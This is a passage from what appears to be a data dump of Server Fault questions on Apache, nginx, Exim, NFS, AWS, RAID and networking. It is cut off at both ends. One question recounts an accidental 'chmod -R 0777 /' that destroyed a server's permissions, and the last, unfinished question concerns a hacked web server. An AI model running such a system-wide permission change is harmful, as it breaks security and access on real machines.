    # Indexes + Directory Root.
    # DirectoryIndex index.html
    DocumentRoot /home/user/example/

    # CGI Directory
    # ScriptAlias /cgi-bin/ /home/drj/wordpress/cgi-bin/
    # &lt;Location /cgi-bin&gt;
        # Options +ExecCGI
    # &lt;/Location&gt;

    # Logfiles
    ErrorLog  logs/wordpress-error.log
    CustomLog logs/wordpress-access.log combined
&lt;/VirtualHost&gt;

&lt;Directory /home/drj/wordpress&gt;
    AllowOverride All
    Require all granted
&lt;/Directory&gt;
</code></pre>

<p>I copied this directly from my original config in Ubuntu, changing only the paths for the logs.</p>
","<apache-2.4><virtualhost><fedora>","2016-07-24 16:01:07"
"791690","Server Log Collection SAAS","<p>I've looked through many SAAS for server/application monitoring. However I'm wondering if there is SAAS that just opens up a API where my application can call to submit logs, and allow me to customize alerts based on the log collected.</p>

<p>Eg. my application submits to <a href=""http://www.saas.com/add_log"" rel=""nofollow noreferrer"">http://www.saas.com/add_log</a>
with {...,""level"":""severe""}</p>

<p>And allows me to customize which users to alert.</p>
","<monitoring>","2016-07-24 22:45:41"
"1001610","Why don't GCP, AWS or Azure support IGMP multicast/broadcast?","<p>It's well known that GCP/AWS/Azure do not support IGMP multicast or broadcast. Some state it's because of security concerns, but don't mention what those concerns are.</p>

<p>Is there a reason why these cloud providers do not support such long-standing, well-specified routing paradigms?</p>
","<amazon-web-services><azure><google-cloud-platform><multicast>","2020-02-03 19:34:31"
"791828","How would I write a batch script that would restart a windows service across multiple servers?","<p>Very new to batch scripts. I know how to stop and start a service, but I'm not certain how I would make the script perform the stop/start across multiple servers.</p>
","<batch-file>","2016-07-25 15:46:25"
"791846","Buying a rack server for small business , please give me tips","<p>Just to start the topic , I'm not really confident with that. My son is programmer and gave the tip to buy a server.
I'm running a small business and I want to buy a rack server instead of paying 30$ every month. I found one used server which I think it's good for me. I want to ask if that's enough to just run a website with 2-3 applications and a database environment? The server price is around 200$
Here are the server specs:</p>

<p>HP ProLiant DL160 G6 Rack</p>

<p>Processor (CPU): 2 x Intel Xeon L5630 2.13Hz Quad Core CPU
Memory (RAM): 16GB DDR3
Hard Disk Controller: On-board HP Smart Array B110i SATA RAID Controller (RAID 0, 1, 1+0)
Hard Disk Configuration: 4 x 3.5"" SATA Hard Drive bays (No Caddies included)
Hard Disk Drive: None Installed
Graphics: 32MB shared supporting all display resolutions up to 1600x1200
Optical Drive: Not Installed
Network Ports: Embedded HP NC362i Integrated Dual Port Gigabit Server Adapter
Power: 460W Power Supply (PSU)</p>

<p>Expansion Slots: 1x PCI-Express x16 expansion slot
1x PCI-Express x8 Gen2 slot HL/LP (internal only)</p>

<p>Interface Ports: 1 x Serial
1 x Video
2 x Network RJ-45
USB 2.0 Ports 4 total: 2 rear, 2 front </p>
","<small-business>","2016-07-25 16:57:38"
"792027","Does using an smtp relay help preventing your email going into spam?","<p>Does using an smtp relay such as google's smtp-relay.gmail.com prevent (or at least help) your emails not going into the spam folder on the recipient? </p>
","<email><postfix><email-server>","2016-07-26 14:14:54"
"792061","Nginx rewrite url from :port to ""login""","<p>Good evening 
I am new to nginx i read around and am a bit confused between redirecting and rewrite what i am looking for is a way to change www.abc.com:3000 to www.abc.com/login</p>

<pre><code>  location /login {
    proxy_pass http://0.0.0.0:3000;
    rewrite ^/login/(.*) /$1 break;
    root /folder/subfolder/new/;
    index login.html;
  }
</code></pre>

<p>What do i need to fix ? </p>

<p>Thank you </p>
","<nginx><port><node.js>","2016-07-26 16:25:02"
"792192","storage sizing for serving high bit rate video","<p>I'm looking at deploying a server for high bit rate video streams up to 250 Mbps. There are 8 clients in the network which at any given point may be playing any given stream, so a worst case scenario is 8 x 250 Mbps or 2000 Mbps. How would I go about sizing the RAID array correctly, given that I would opt for a RAID5 array? Can I consider this as a strictly sequential I/O workload and would therefore basic calculations suffice? I.e. a RAID5 array of 8 disks with 150 MB/s throughput per disk would yield around 1200 MBps sequential throughput which would be theoretically sufficient. Thanks for your insights.</p>
","<raid5><streaming><video><sizing>","2016-07-27 08:46:04"
"792230","IP address redirects to www.IP address","<p>I have a Google Cloud Compute instance running a Bitnami Magento stack. For some strange reason if I try to browse to the site via the IP address it prefixes the IP address with www. so fails. The site domain name is fine. </p>

<p>This is relevant because you can only access phpmyadmin on a bitnami stack from 127.0.0.1 (after creating an SSH tunnel). Problem is this is being redirected to www.127.0.0.1 and fails. </p>

<p>I can't find anything in the apache2 conf files that account for this behaviour. Magento itself is setup correctly and works fine. The problem began after discovering a rogue package had been uploaded (this has since been cleaned).</p>

<p>Any ideas greatfully received, it's driving me nuts.</p>
","<magento><apache2><bitnami>","2016-07-27 11:25:58"
"1002155","How to avoid HSTS error by hosts redirect with self-signed certificate?","<p>I created this records in windows hosts file </p>

<pre><code>127.0.0.1 a.domain.name
127.0.0.1 b.domain.name
127.0.0.1 c.domain.name
</code></pre>

<p>where<br> 
<strong>127.0.0.1</strong> - ip of my server<br>
<strong>[a,b,c].domain.name</strong> - domains wich from i need to get redirect to my server
<br>
<br>
So, how i need to create self-signed certificate to get trusted from browsers and avoid HSTS error?</p>
","<ssl><hosts><self-signed-certificate><hsts>","2020-02-07 08:53:18"
"792497","Accessing a Program Over a Network","<p>My boss is looking for us to have as little local installs as possible. We're running Active Directory on Server 2016. We're trying to install Platypus Billing System and a Watchguard VPN over a network for users to access from a Mapped Drive.</p>

<p>So far I've read no, but I haven't found many articles/forums on this issue.</p>

<p>So, is there a way to access programs installed on a network share from all the computers on the domain? Or do I have to RDP into a VM to do it?</p>
","<networking><active-directory><windows-server-2016>","2016-07-28 14:27:53"
"792529","I want to remotely connect to my computer","<p>I am using Reliance 4G mobile internet (i connect through mobile wifi hotspot to pc), my mobile has been assigned a ip of 10.x.x.x network (private) and , when i use hotspot my pc is assigned ip in network of 192.168.x.x , Now I want that I,or somebody else.. can remotely connect to my pc, (This was easy while using Landline Broadband connection with help of port forwarding technique,) Now as i cannot port forward, Is there any way to accomplish this task. I googled a lot, there I found solution,... to use VPN, so i configured OpenVPN on my linux machine.. VPN Connection was successful (I used free vpn service and trial vpn services) and my public ip was also changed.. but still I cannot forward any port or cannot access my system through internet. Please provide me a solution.</p>
","<openvpn><port-forwarding><remote-access><wide-area-network>","2016-07-28 17:25:42"
"792610","https works on webmin but not on domain name","<p>I got an issue with the https request, when it comes to the access webmin, is working fine even the certificates are working pretty good. when i try to access the domain using https is not working. I am using an Amazon Web Service. on Aws the i have the 443 open. When i <code>curl https://localhost:443</code> i got <code>curl: (7) Failed to connect to localhost port 443: Connection refused</code></p>

<p>Website : <a href=""http://tituslucian.com"" rel=""nofollow noreferrer"">http://tituslucian.com</a> Webmin : <a href=""https://tituslucian.com:2011/"" rel=""nofollow noreferrer"">https://tituslucian.com:2011/</a></p>

<p>/etc/apache2/sites-available</p>

<pre><code> &lt;VirtualHost *:*&gt;


    ServerAdmin adascaliteilucianfelix@gmail.com
    DocumentRoot /var/www/html/tituslucian.com


    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    ServerName tituslucian.com

&lt;Directory /var/www/html/tituslucian.com&gt;


        Options Indexes FollowSymLinks MultiViews
                    AllowOverride All
                    Order allow,deny
                    allow from all
    &lt;/Directory&gt;
    &lt;/VirtualHost&gt;
</code></pre>

<p>Can someone help me with this, or at least give me some hints/ideas ?</p>
","<amazon-web-services><https><webmin><apache2>","2016-07-29 04:36:34"
"792632","Loadbalancer and Tomcat","<p>Currently we have a single tomcat 7 running as our application server, but with users increasing we were thinking of the following,</p>

<p>1) Put a hardware load balancer
2) Put two tomcat servers on separate machines for HA behind the load balancer.</p>

<p><strong>Questions</strong></p>

<ol>
<li>We want to cluster the two tomcats, is there any dis-advantage.</li>
<li>Would hardware loadbalancers before tomcat not be enough, what's the
advantage of putting apache servers? </li>
<li>We want to offload SSL at
Load-Balancer, an impacts or issues we see in this approach?</li>
</ol>
","<load-balancing><high-availability><tomcat7>","2016-07-29 07:21:07"
"792675","Sudo makemap permission denied","<p>I'm trying to use the <code>makemap hash</code> command, but even as root it says <strong>Permission denied</strong>.
Command i'm trying to run:</p>

<pre><code>sudo makemap hash /etc/mail/authinfo/gmail-auth &lt; /etc/mail/authinfo/gmail-auth
-bash: /etc/mail/authinfo/gmail-auth: Permission denied
</code></pre>
","<centos><permissions><centos7><sudo>","2016-07-29 10:30:30"
"1002362","NFS SATA vs SAS for VMware datastore?","<p>Lately I have been seeing people online and their followers making NFS servers with SATA SSDs for VMware Datastores. This enraged me! SATA is half duplex and SAS is full. A 15k SAS at 6Gbs with a 6Gbps raid card would blow away a SATA SSD when the server has multiple VMs running on it. So the question, did I miss something? Am I wrong? Or are these people just misinformed?</p>
","<sas>","2020-02-09 01:52:20"
"792741","EXIM relay only if recipient is at hotmail.com","<p>I'm currently using a relay service (mailchannels and sendgrid) to send about 200k messages per month of our cPanel services, but I'd like to route only messages that have HOTMAIL recipients (because they're the main reason for us to relay mails.. our messages are never delivered on mailbox using our ips -- GMAIL and all other providers are delivered without problems).</p>

<p>This is how my config looks like:</p>

<pre><code>SECTION: AUTH
sendgrid_login:
driver = plaintext
public_name = LOGIN
client_send = : USER : PW
</code></pre>

<p>-</p>

<pre><code>Section: PREROUTERS
send_via_sendgrid:
driver = manualroute
domains = ! +local_domains
transport = sendgrid_smtp
route_list = ""* smtp.sendgrid.net::587 byname""
host_find_failed = defer
no_more
</code></pre>

<p>-</p>

<pre><code>Section: TRANSPORTSTART
sendgrid_smtp:
driver = smtp
hosts = smtp.sendgrid.net
hosts_require_auth = smtp.sendgrid.net
hosts_require_tls = smtp.sendgrid.net
</code></pre>

<p>I know that I should change the PREROUTERS section and out some condition there, but don't know how!</p>

<p>Any help will be appreciated. </p>

<p>Thanks!</p>
","<exim><cpanel><sendgrid>","2016-07-29 14:40:28"
"792787","File server audit for multiple file types","<p>So, here's the deal...one of our clients never put any sort of restrictions on their file servers in regards to what type of files their users could put in their network drives. So, users being users, they put everything on them, including movies, songs, jpg's, etc etc etc.</p>

<p>While they're not planning on putting any restrictions in place right now (something I've fought for multiple times, but hey, I can only push so far), I have to get together a list of the various file types on the servers, and a list containing at least a majority of the file locations so we can try to clean up what we can before they migrate their data to a combination of OneDrive and a hosting solution later this year/early next year. This would include for .pst files, .ost files, .jpg, .avi, .mpg, .mp4, and at least potentially others.</p>

<p>Does anyone have any recommendations for a utility or PowerShell script to find and create a list of any folders containing files of specific file types, along with the size of the folder? I've been using WinDirStat for a lot of this stuff, but without being able to create a report of any sort, it's usefulness for this task is fairly limited, unless if I want to spend days going through it for each of the four file servers. I've been looking around online, but I haven't found anything so far.</p>
","<windows-server-2008-r2><windows-server-2012-r2>","2016-07-29 17:59:03"
"1002530","Script to grep large file","<p>I have a file that has about 63000 row I need to grep though</p>

<pre><code>[root@server]# cat missinglinks.txt
69870  1.pdf.Published
125098 2.png.Published
125022 3.pdf.Published
69867  4.png.Published
</code></pre>

<p>I have a list of 450 numbers that will match some of the row in the missinglinks.txt file</p>

<pre><code>[root@server]# cat missinglinksA.sh
125105
125104
125103
125102
125100
125099
125098
125097
125022
</code></pre>

<p>I am trying to use a script to take the first row from missinglinksA.sh and grep missinglinks.txt and output to a file, then the second, n.....</p>

<pre><code>for n in $(cat missinglinksA.txt)
do
    cat missinglinks.txt | grep $n
done
</code></pre>

<p>I would like an output file like:</p>

<pre><code>[root@server]# cat missinglinksAout.txt
125098 2.png.Published
125022 3.pdf.Published
</code></pre>

<p>I cannot however get the output either on the screen or to a text file, I am not sure if I am doing something wrong or if the script is simply not outputing. </p>

<p>I have -o -i none seem to fix the issue.</p>

<p>I can do:</p>

<pre><code>[root@server]# cat missinglinksA.txt | grep 125098 &gt;&gt; missinglinksAout.txt
</code></pre>

<p>And it works.</p>

<pre><code>[root@server]# cat missinglinksAout.txt
125098 2.png.Published
</code></pre>

<p>I have taken the top 10 rows from the missinglinksA.txt file and made a script to check each line and that does not work either, blank output.</p>

<pre><code>[root@server]# cat missinglinksAtesteachline.sh
cat missinglinksA.txt | grep 125105
cat missinglinksA.txt | grep 125104
cat missinglinksA.txt | grep 125103
cat missinglinksA.txt | grep 125102
cat missinglinksA.txt | grep 125100
cat missinglinksA.txt | grep 125099
cat missinglinksA.txt | grep 125098
cat missinglinksA.txt | grep 125097
cat missinglinksA.txt | grep 125022

[root@server]# sh missinglinksAtesteachline.sh
[root@server]#
</code></pre>
","<bash><grep>","2020-02-10 18:03:23"
"792879","Time taken to replicate a storage array of 1 petabytes","<p>Suppose i have a storage array of size 1 petabytes. And i want to replicate it to another storage array, may be for backup purposes.</p>

<p>What i want to know is, </p>

<p>the things that I have to keep in mind while calculating the time, </p>

<p>the things that will effect the time taken for transfer, </p>

<p>and may be an idea of the time taken.</p>
","<storage>","2016-07-30 13:10:27"
"792957","Silly little CentOS 6.8 32-bit webserver crashes, OOM after killing everything","<p>System is an old Compaq Presario, Athlon XP 2000+, 512M RAM (~504M after 8MB shared with graphics). 1GB swap, kernel 2.6.32-642.3.1.el6.i686</p>

<p>Yeah yeah, add more RAM, buy a real server, etc... but even shiny new can run into stuff, trying to learn how to troubleshoot this.. am stuck</p>

<p>Really only running httpd, mysqld. Has a small WordPress site that isn't accessed very much, an rysnc task that runs each hour to snapshot the drive and runs an fs dump (on LVM snapshot) each night... assuming it gets to that point.</p>

<p>Was running OK when first installed a few months ago, even with using DropBox CLI to keep backup files in sync on Dropbox... Have stopped dropbox service trying to narrow down issue.</p>

<p>Now past several weeks, I am getting hard crash - system can't do anything without a hard reboot, /var/log/messages stops short of showing the properly - like this last time the last message is ""dhclient: No working leases in persistent database - sleeping""</p>

<p>Before this are several OOM-killer runs at about ~480M used ( +/- buffers, even... ), killing mysqld and httpd tasks first, then ntpd, etc... until nothing can be killed...</p>

<p>I added a cron job to logger output from free -m every 5 minutes - once OOM starts, I don't see those messages in the logs, but there is steady creep from ~200M used at boot to this ~480M where the system freaks out. Swap only gets about ~10M used at most.</p>

<p>So if nothing is running on the system at that point, what is causing the crashes?</p>
","<centos><centos6>","2016-07-31 07:55:01"
"1002672","Internet connection slow in linux","<p>I have a problem with my new internet connection. This is a symmetric 500Mbs connection but i only get 50M in my linux computer. In windows I get 500Mb for up and down with other computer. 
I know that the problem is in my ethernet connection in linux because my speed in ethernet card is 100Mb. I don't know why. </p>

<p>This is the ethernet card values (it supports 1Gb)</p>

<pre><code>    Supported ports: [ TP MII ]
    Supported link modes:   10baseT/Half 10baseT/Full 
                            100baseT/Half 100baseT/Full 
                            1000baseT/Full 
    Supported pause frame use: Symmetric Receive-only
    Supports auto-negotiation: Yes
    Supported FEC modes: Not reported
    Advertised link modes:  10baseT/Half 10baseT/Full 
                            100baseT/Half 100baseT/Full 
                            1000baseT/Full 
    Advertised pause frame use: Symmetric Receive-only
    Advertised auto-negotiation: No
    Advertised FEC modes: Not reported
    Speed: 100Mb/s
    Duplex: Half
    Port: MII
    PHYAD: 0
    Transceiver: internal
    Auto-negotiation: off
    Supports Wake-on: pumbg
    Wake-on: d
    Current message level: 0x00000033 (51)
                           drv probe ifdown ifup
    Link detected: yes
</code></pre>

<p>I tried with ethtool but when I try to change to 1000Mb/s with </p>

<pre><code>$ sudo ethtool -s enp3s0 speed 1000 duplex full

Settings for enp3s0:
        Supported ports: [ TP MII ]
        Supported link modes:   10baseT/Half 10baseT/Full 
                                100baseT/Half 100baseT/Full 
                                1000baseT/Full 
        Supported pause frame use: Symmetric Receive-only
        Supports auto-negotiation: Yes
        Supported FEC modes: Not reported
        Advertised link modes:  1000baseT/Full 
        Advertised pause frame use: Symmetric Receive-only
        Advertised auto-negotiation: No
        Advertised FEC modes: Not reported
        Speed: 1000Mb/s
        Duplex: Full
        Port: MII
        PHYAD: 0
        Transceiver: internal
        Auto-negotiation: off
        Supports Wake-on: pumbg
        Wake-on: d
        Current message level: 0x00000033 (51)
                               drv probe ifdown ifup
        Link detected: no
</code></pre>

<p>but I get no link connection </p>

<p>If I try to up the enp3s0 the 1000Mb speed disappears and I get 100M again </p>

<pre><code>$ sudo ifup enp3s0 

$ 
Settings for enp3s0:
        Supported ports: [ TP MII ]
        Supported link modes:   10baseT/Half 10baseT/Full 
                                100baseT/Half 100baseT/Full 
                                1000baseT/Full 
        Supported pause frame use: Symmetric Receive-only
        Supports auto-negotiation: Yes
        Supported FEC modes: Not reported
        Advertised link modes:  1000baseT/Full 
        Advertised pause frame use: Symmetric Receive-only
        Advertised auto-negotiation: No
        Advertised FEC modes: Not reported
        Speed: 100Mb/s
        Duplex: Half
        Port: MII
        PHYAD: 0
        Transceiver: internal
        Auto-negotiation: off
        Supports Wake-on: pumbg
        Wake-on: d
        Current message level: 0x00000033 (51)
                               drv probe ifdown ifup
        Link detected: yes
enp3s0: 100 Mbit, half duplex, link ok
$ 
</code></pre>

<p>I don't know what else to try. </p>

<p>Thanks</p>
","<linux><networking><linux-networking><connection><slow-connection>","2020-02-11 17:49:02"
"1002710","Why are some software packages so big?","<p>Some packages that I install – which I assume contain nothing but code – are tens or even hundreds of MB. For example, I recently installed <a href=""https://pytorch.org/"" rel=""nofollow noreferrer"">pytorch</a> and the size of the binary was 428 MB. </p>

<p>How can there possible be that much code?</p>
","<files><packages>","2020-02-12 00:07:30"
"793186","# sudo dd bs=512 count=1 if=/dev/sda 2>/dev/null | strings","<h1>sudo dd bs=512 count=1 if=/dev/sda 2>/dev/null | strings</h1>

<p>t&amp;fh
TCPAu2
r,fh
fSfSfUfh
Invalid partition table
Error loading operating system
Missing operating system
/`8:
what does this mean</p>
","<fedora>","2016-08-01 16:51:17"
"793216","is there a difference plug setup between cat 5 and cat 5e?","<p>Is there a difference in either the RJ45 plug or the wiring into the plug (for 568B) between a Cat 5 and Cat 5e cable, used for connecting a router to a computer?</p>

<p>Here's a  little background info.  I'm a newbie to networking so to learn I wired my own home network.  I purchased Cat 5e cable and RJ45 jacks from Home Depot, put them together and hard wired my computer to my router.  It all seemed to be fine until I did a speed test.  My ISP connection is providing 350 mbs download while I am coming in just under 100mbs.  When I swapped out the wire I made to a different 5e cable I had from the ISP, the download speed jumped to a racing 350 mbs download.  </p>

<p>So now I'm trying to track what's off with my setup.  As far as I've found the only difference tween a 5 and 5e is the wire design, not the pair (color) order into the RJ45 or the RJ45 itself.  Is this correct?  </p>

<p>I'm assuming that there's a problem with either the wire or the RJ45's I purchased.  Is there something else I should be considering?</p>

<p>Thanks.</p>
","<networking><wiring><cat5e><cat5><rj45>","2016-08-01 18:32:25"
"793320","effective uid is not 0, is sudo installed setuid root?","<p>I am using a cloud server of godaddy &amp; I don't have root password. My master user has root access through sudo. I was trying to create another user and set permission for a specific directory. I've created a news user testuser &amp; created a new directory named ""test"" under var/www/html/. I was trying to set permission:</p>

<pre><code>chmod -R 0777 /var/www/html/test
</code></pre>

<p>but unfortunately i press enter before mentioning the directory. That means I just change the whole permission</p>

<pre><code>chmod -R 0777 /
</code></pre>

<p>Now, unfortunately I don't have root password &amp; sudo, su are not working anymore. changing permission is showing</p>

<pre><code>Operation not permitted
</code></pre>

<p>and sudo is showing the following error:</p>

<pre><code>""effective uid is not 0, is sudo installed setuid root?""
</code></pre>

<p>I've several project live on the server. is there any way to restore the user permission. I don't want to reinstall the whole cent OS.</p>

<p>I've checked the <code>ls -l</code> and all permission are set to <code>drwxrwxrwx</code></p>

<p>Please help me solve the problem.</p>
","<centos><sudo>","2016-08-02 10:25:34"
"1003059","Whitelisting my home router on corporate servers?","<p>I need to access my corporate server (which is restricted) from my home. Corporate Admin is asking for Gateway IP of my home network so that they can whitelist my Home network. Basically, All my devices connected to my home Router should able to access my corporate server. 
<a href=""https://i.sstatic.net/9v4p9.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/9v4p9.png"" alt=""enter image description here""></a></p>

<p>So, I am thinking of two methods</p>

<ol>
<li><p>Should I Give my ""Router's Public IP (60.XX.XX.20)""?- But If I give this, Restarting my router is changing the Public IP. So no use of giving this IP.</p></li>
<li><p>Should I give gateway to my  ""Router's Public IP (60.XX.XX.1)""? - This, I am assuming that the gateway of the ""Router's Public IP"" that is 60.XX.XX.1 will expose all the rage of IP following that.</p></li>
</ol>

<p>Please give your suggestions.</p>
","<firewall><router><gateway><whitelist>","2020-02-14 11:51:12"
"793531","Permission denied mounting NFS volume on raspberry PI with Synology","<p>on my diskstation: </p>

<pre><code>/volume1/Blockchain 192.168.1.27(rw,async,no_wdelay,insecure,no_root_squash,insecure_locks,sec=sys,anonuid=1025,anongid=100)
/volume1/BigStore   *(rw,async,no_wdelay,root_squash,insecure_locks,sec=sys,anonuid=1025,anongid=100)
</code></pre>

<p>On my raspberry pi /etc/fstab:</p>

<pre><code>192.168.1.15:/volume1/Bitcoin /mnt/Bitcoin nfs rw,relatime,vers=3,rsize=131072,wsize=131072,namlen=255,hard,proto=tcp,timeo=600,retrans=2,mountvers=3,mountport=892,mountproto=udp,local_lock=none
</code></pre>

<p>Running mount on the raspberry pi:</p>

<pre><code>raspberrypi:~ $ sudo mount  192.168.1.15:/volume1/Bitcoin /mnt/Bitcoin
mount.nfs: access denied by server while mounting 192.168.1.15:/volume1/Bitcoin
</code></pre>

<p>Any ideas</p>
","<nfs><synology><raspbian>","2016-08-03 06:44:28"
"1003257","Can't ping EC2 instance after enabling ICMP packets","<p>I followed this <a href=""https://stackoverflow.com/questions/21981796/cannot-ping-aws-ec2-instance"">guide</a> to allow me to ping my EC2 instance. In my security group I have Custom ICMP Rule - IPv4, Echo Reply, N/A, Anywhere.</p>

<p>However it simply doesn't work. If i run ping ec2-X-X-X-X.ap-northeast-1.compute.amazonaws.com, or if I run ping X.X.X.X, it simply hangs forever. How to fix this?</p>

<p>My VPC settings are all default. The subnet route table has an internet gateway enabled and Network ACL allows all traffic in and out.</p>
","<amazon-ec2><firewall><ping><icmp><security-groups>","2020-02-16 08:48:30"
"1003537","How to break Windows Server 2019 in a way which will require an admin to check logs to find the answer","<p>I am building a lab environment to up-skill admins to windows and have included various troubleshooting tasks. I would like to break DNS or some other service in a way that would require them to look at logs.</p>

<p>I can think of plenty of times where something has inadvertently broken and i found the issue in the logs but I can't think of anything straight forward that would be easy to reproduce and fix that would be good for this scenario.</p>
","<windows><active-directory><windows-server-2019><windows-dns>","2020-02-18 13:54:40"
"794809","proxy main domain to a subdomain","<p>I want to redirect a main domain to a subdomain for example <strong>www.abc.com</strong> to <strong>xyz.test.com</strong>. Whenever i type <strong>www.abc.com</strong> it should be redirect to <strong>xyz.test.com</strong>. Both domain are hosted on same server.</p>

<p>Subdomain <strong>xyz.test.com</strong> is not a virtual host of web server (i.e. apache &amp; nginx) it is code generated website and you can directly access it via <strong><a href=""http://xyz.test.com"" rel=""nofollow noreferrer"">http://xyz.test.com</a></strong>. I'm using apache and nginx both so whatever best fit i will use. Any help would be appreciated.</p>

<p>Thank You :)</p>
","<apache-2.2><nginx><web-server>","2016-08-04 10:10:30"
"1003596","WordPress - phpMyAdmin - Database has been wiped","<p>This morning I got a message from an editor of a WordPress site on a domain that I manage. The wordpress site had reset to default.</p>

<p>I logged into the Plesk panel and the media content is still there as it should be, the database tables are there but all of the database content is gone.</p>

<p>There have been no recent backups of the site taken.</p>

<p>I've read through the logs in plesk but I'm unsure of what to look for and can't see anything obvious as to what happened.</p>

<p>There doesn't appear to be a log in phpMyAdmin where I can see logs of when the entries were deleted.</p>

<p>Can you advise me on what I should look for to try to identify the root cause of the issue?</p>
","<web-server><wordpress><phpmyadmin><plesk>","2020-02-18 18:56:03"
"794885","GPO not applied (unknown reason)","<p>I have a <strong>user configuration</strong> GPO (nothing on the computer side and computer configuration is disabled), linked to a <strong>user only OU</strong>.</p>

<p>I need to filter the users on which the GPO apply. When using specific users or groups in the security filtering, the GPO is not applied on the user side : ""Not applied (unknown reason).""
When using the default ""Authenticated users"" group the GPO is applied.</p>

<p>I'm on a W 2012 R2 domain with W10 clients.</p>

<p>I'm lost. Any ideas ?</p>
","<group-policy><windows-server-2012-r2><domain>","2016-08-04 15:28:29"
"1003687","Why AWS encryption for EBS and S3 is disabled by default?","<p>For EBS and S3 encryption (even via the default key from KMS) is disabled by default, as I understood from the documentation, there is no difference to the user if volume/objects is/are encrypted under the hood or not. If it is true, why this option is disabled by default? And if not, what are the drawbacks?</p>

<p>Thanks.</p>
","<amazon-web-services><security><amazon-s3><encryption><amazon-ebs>","2020-02-19 10:10:51"
"1003989","Amazon EFS performance mounted for a k8 cluster of ec2 instances with small frequent writes","<p>How performant is a shared mounted EFS if there are multiple ec2 instances with multiple containers all writing to separate files in separate directories? Can write performance on one container be detrimentally affected by another container writing (on the same or different node). </p>

<p>Writes are normally extremely small (~kbs) and can burst to ms frequency.</p>
","<amazon-web-services><nfs><amazon-efs>","2020-02-21 00:13:15"
"1004042","Which tool to use when monitoring machines (linux+windows) with one way communication?","<p>I have 100+ machines which needs to be monitored, mostly linux, but there are some Windows servers too. I want to be informed when the disks are getting full, when the load is high, or a service is not responding, etc...</p>

<p>As I understand SNMP is not good, since it requires two way communication, and I do not want to open ports (and some of these machines are behind NAT-s and VPN-s).</p>

<p>What I want is: Install an agent to every machine. This agent sends info periodically to a central server. I show these data on the server, and send out notifications when something needs attention.</p>

<p>Is there any - opensource - tool to do this?</p>
","<monitoring>","2020-02-21 11:03:51"
"1004059","How does Nginx act as both reverse proxy and web server?","<p>This might be a naive question. But I'm too new to client and server concept and wanted to know.</p>

<p>I understood what a <strong>Reverse proxy</strong> is - a server that sits in between clients and origin servers and forwards requests on behalf of clients to actual servers.</p>

<p>I understood what a <strong>web server</strong> is - a server that actually serves the <code>http</code> content.</p>

<p>What I don't understand is - <strong>Nginx</strong> act as both <strong>Reverse proxy</strong> and <strong>Web server</strong>. How does it act as both when both are different.</p>
","<apache-2.2><nginx><web-server><reverse-proxy>","2020-02-21 12:40:09"
"1004062","Dell PowerEdge 2950 with PERC 5/i - pxe-e53 boot","<p>I have an old PE 2950 that I use for all my home automation needs.
Work great since a while, but, I was trying to upgrade my harddrive and now I have problem.</p>

<p>Here's my setup before :</p>

<p>1- RAID-5 array with 6 disks and 1 Virtual Disks
2- RAID-0 array with 1 disk </p>

<p>My goal was to replace 2 disks in my first array, so I replaced the harddrives then boot the server. I got some config errors before going in the PERC controller management.</p>

<p>From the management, I :
1- Removed all my RAID-5 configuration
2- Created a new disk group in RAID-10 with all my 6 disks
3- Initialized the VD</p>

<p>After that, I saw in the foreign configuration that I had the disk, from my array 2, that was in a ""foreign"" mode. I then choose to CLEAR all foreign.</p>

<p>I then, after, recreated a disk group and a new VD for my harddisk that I want to be in RAID-0.
Note : I didn't re-initialize it, because I would prefer to not lost the DATA originally on the disk.</p>

<p>So now my config is :
1- RAID-10 array with 6 disks and 1 Virtual Disks
2- RAID-0 array with 1 disk </p>

<p>I as able to reboot the server and boot on a DVD to install ESXI-5. From the installation, I was able to see my 2 virtual disks so I decided to install the OS on my VD from my  RAID-10 configuration.
Install has been successul.</p>

<p>But now, after the reboot, I get each time : PXE-E53 No boot.
I am stuck there. </p>
","<raid><dell-poweredge><pxe-boot><dell-perc>","2020-02-21 12:49:51"
"1004073","nginx limit_rate from certain file size","<p>I have limited the download speed on my nginx site with this option:</p>

<pre><code>limit_rate 350k;
</code></pre>

<p>Is it possible to do this only if the file size is larger then 10Mb?
Thank you.</p>
","<nginx>","2020-02-21 13:25:41"
"795412","search n replace nth line in a file","<p>appreciate if anyone can help me to do so. what i want to achieve is - in file called test.conf file consist with multiple paragraphs. First search for the word ""Full"" in that para, if found then go to the 3rd line of that paragraph then find and replace word ""old"" to ""NEW"". Have a look in example but in 2nd Paragraph i don't want to replace ""old"" to ""NEW"" because first condition, the word ""Full"" doesn't exist in that paragraph. Right after that in 3rd paragraph need to replace ""old"" to ""NEW"" because both condition exists.</p>

<p>in other way if first search pattern ""Full"" and second pattern ""old"" both found then replace 2nd pattern ""old"" with ""NEW"" otherwise do nothing </p>

<p>cat test.conf</p>

<pre><code>       description
        server1
        group members
        User CMF **Full** 
        cont_Bred,cont_Hery,cont_Josh
        a,b,c,d
        **old**!text!user_CMF!CMF


        description
        server1
        group members
        User CMF Half 
        cont_Bred,cont_Hery,cont_Josh
        a,b,c,d
        old!text!user_CMF!CMF


        description
        server1
        group members
        User HTP **Full** 
        cont_Bred,cont_Hery,cont_Josh
        a,b,c,d
        **old**!text!user_HTP!HTP
</code></pre>
","<sed>","2016-08-08 05:11:35"
"1004146","Server hacked and lots of randomly named .php files in the webspace directories","<p>So apparently my Server kinda got hacked. I don't think that someone got access to the root user or any other user but in every main directory of the www-data user there were a lot of weird files. </p>

<p>Files like these: </p>

<blockquote>
